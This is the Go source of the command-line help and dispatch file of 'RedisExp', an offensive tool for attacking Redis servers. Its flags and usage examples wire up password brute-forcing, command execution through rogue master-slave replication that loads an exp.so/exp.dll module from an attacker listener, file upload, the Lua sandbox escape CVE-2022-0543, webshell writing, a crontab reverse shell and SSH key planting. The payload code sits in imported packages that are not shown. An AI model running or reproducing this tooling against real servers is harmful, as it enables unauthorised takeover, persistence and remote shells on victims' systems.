package help

import (
	"RedisExp/pkg/brute"
	"RedisExp/pkg/conn"
	"RedisExp/pkg/echo"
	"RedisExp/pkg/logger"
	"RedisExp/pkg/lua"
	"RedisExp/pkg/slave"
	"flag"
	"fmt"
	"strings"
)

var (
	cmd       string
	console   bool
	exec      bool
	upload    bool
	luaBool   bool
	shell     bool
	bruteBool bool
	pwdf      string
	pwd       string
	slaveof   bool

	rhost string
	rport string

	lhost string
	lport string
	dll   string

	rpath string
	rfile string
	lfile string

	cli bool

	crontab bool

	ssh bool

	show bool
)

func init() {
	flag.BoolVar(&upload, "upload", false, "主从复制-文件上传")
	flag.BoolVar(&exec, "exec", false, "主从复制-命令执行")
	flag.BoolVar(&console, "console", false, "使用交互式 shell")
	flag.StringVar(&cmd, "c", "whoami", "执行命令")
	flag.StringVar(&dll, "so", "exp.dll", "设置 exp.dll | exp.so")

	flag.BoolVar(&luaBool, "lua", false, "Lua沙盒绕过命令执行 CVE-2022-0543")

	flag.BoolVar(&bruteBool, "brute", false, "爆破 Redis 密码")
	flag.StringVar(&pwdf, "pwdf", "", "设置密码字典")
	flag.StringVar(&pwd, "pwd", "", "设置密码")

	flag.BoolVar(&slaveof, "slaveof", false, "关闭主从复制")

	flag.StringVar(&rhost, "rhost", "", "目标 IP")
	flag.StringVar(&rport, "rport", "6379", "目标端口")

	flag.StringVar(&lhost, "lhost", "", "本地 IP")
	flag.StringVar(&lport, "lport", "21000", "本地端口")

	flag.StringVar(&rpath, "rpath", ".", "保存在目标的目录")
	flag.StringVar(&rfile, "rfile", "", "保存在目标的文件名")
	flag.StringVar(&lfile, "lfile", "", "需要上传的文件名")

	flag.BoolVar(&cli, "cli", false, "执行 Redis 命令")

	flag.BoolVar(&shell, "shell", false, "备份写 Webshell (shell.txt)")
	flag.BoolVar(&crontab, "crontab", false, "Linux 定时任务反弹 Shell (crontab.txt)")
	flag.BoolVar(&ssh, "ssh", false, "Linux写 SSH 公钥 (ssh.txt)")

	flag.BoolVar(&show, "show", false, "工具利用命令帮助")

}

func Help() {
	flag.Parse()

	if show {
		fmt.Println(`Example:
主从复制命令执行:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console

Linux:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -so exp.so
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -exec -console -so exp.so

主从复制文件上传:
RedisExp.exe -rhost 192.168.211.131 -lhost 192.168.211.1 -rfile dump.rdb -lfile dump.rdb -upload

主动关闭主从复制:
RedisExp.exe -rhost 192.168.211.131 -slaveof

Lua沙盒绕过命令执行 CVE-2022-0543:
RedisExp.exe -rhost 192.168.211.131 -lua -console

备份写 Webshell:
RedisExp.exe -rhost 192.168.211.131 -shell

Linux 写计划任务:
RedisExp.exe -rhost 192.168.211.131 -crontab

Linux 写 SSH 公钥:
RedisExp.exe -rhost 192.168.211.131 -ssh

爆破 Redis 密码:
RedisExp.exe -rhost 192.168.211.131 -brute -pwdf ../pass.txt

执行 Redis 命令:
RedisExp.exe -rhost 192.168.211.131 -cli

		`)
	}

	if rhost == "" {
		logger.Info("RedisExp.exe -h 靓仔查看下详细帮助吧")

		return
	}

	// 爆破密码
	if bruteBool {
		if pwdf == "" {
			logger.Info("缺少字典参数 -pwdf")
			return
		}

		brute.BrutePWD(rhost, rport, pwdf)
		return
	}

	// 连接 Redis
	err := conn.RedisClient(rhost, rport, pwd)

	if err != nil {
		switch {
		case strings.Contains(err.Error(), "context deadline exceeded"):
			logger.Info("Redis 连接超时")
		case strings.Contains(err.Error(), "NOAUTH Authentication required."):
			logger.Info("Redis 需要密码认证")
		case strings.Contains(err.Error(), "ERR invalid password"):
			logger.Info("Redis 认证密码错误!")
		}

		return
	}

	switch {
	case exec:
		if lhost == "" {
			logger.Info("缺少 Lhost 参数")
			return
		}
		if console {
			slave.RedisSlave(lhost, lport, dll)
			slave.LoopCmd(dll, "exec")
		} else {
			slave.RedisSlave(lhost, lport, dll)
			slave.RunCmd(cmd)
			slave.CloseSlave(dll, "exec")
		}

	case upload:
		if rfile == "" || lfile == "" || lhost == "" {
			logger.Info("rfile | lfile | lhost 参数不能为空")
			return
		}
		slave.RedisUpload(lhost, lport, rpath, rfile, lfile)

	case luaBool:
		if console {
			slave.LoopCmd("", "lua")
		} else {
			if cmd == "" {
				logger.Info("缺少 cmd 参数, 无法执行命令哦")
				return
			}
			lua.RedisLua(cmd)
		}

	case shell: // 备份写shell
		echo.Echo("getshell")

	case crontab: // 定时任务反弹 Shell
		echo.Echo("crontab")
	case ssh: // 写 ssh 公钥
		echo.Echo("ssh")

	case cli: // 执行 Redis 命令
		conn.LoopRedis(rhost, rport)
	case slaveof: // 关闭主从
		slave.CloseSlave("", "")

	}

}
